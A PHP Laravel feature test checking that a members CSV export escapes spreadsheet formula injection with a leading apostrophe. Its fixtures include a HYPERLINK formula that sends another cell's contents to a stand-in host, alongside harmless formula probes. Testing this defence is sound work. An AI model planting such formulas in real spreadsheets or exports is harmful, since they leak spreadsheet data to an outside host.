<?php

namespace Tests\Feature;

use App\Exports\UsersExport;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Maatwebsite\Excel\Excel as ExcelFormat;
use Maatwebsite\Excel\Facades\Excel;
use Tests\TestCase;

/**
 * Security plan S11: the Members export never hands a spreadsheet a formula a member typed as their name or address.
 * A cell that starts with = + - @ (or a tab / carriage return) gets a leading apostrophe, which keeps it plain text in
 * Excel, LibreOffice and Google Sheets; every other value is unchanged.
 */
class UsersExportFormulaTest extends TestCase
{
    use RefreshDatabase;

    public function test_member_text_never_becomes_a_formula(): void
    {
        $formulas = ['=HYPERLINK("https://e.x/?"&C2,"x")', '+1+2', '@SUM(1,2)', '-2+3', "\tlead-tab"];

        foreach ($formulas as $i => $name) {
            User::factory()->create(['username' => $name, 'email' => 'formula'.$i.'@example.test']);
        }

        User::factory()->create(['username' => 'plain-member', 'email' => '=1+1@example.test']);
        User::factory()->create(['username' => 'Nguyễn Văn A', 'email' => 'ordinary@example.test']);

        $rows = array_map('str_getcsv', array_filter(explode("\n", str_replace("\r\n", "\n", (string) Excel::raw(new UsersExport([]), ExcelFormat::CSV)))));
        $cells = [];

        foreach (array_slice($rows, 1) as $row) {
            $cells[$row[1]] = $row[2];
        }

        foreach ($formulas as $name) {
            $this->assertArrayHasKey("'".$name, $cells, 'the name keeps its text behind an apostrophe: '.$name);
        }

        $this->assertSame("'=1+1@example.test", $cells['plain-member']);
        $this->assertSame('ordinary@example.test', $cells['Nguyễn Văn A'], 'ordinary values are unchanged');
    }
}
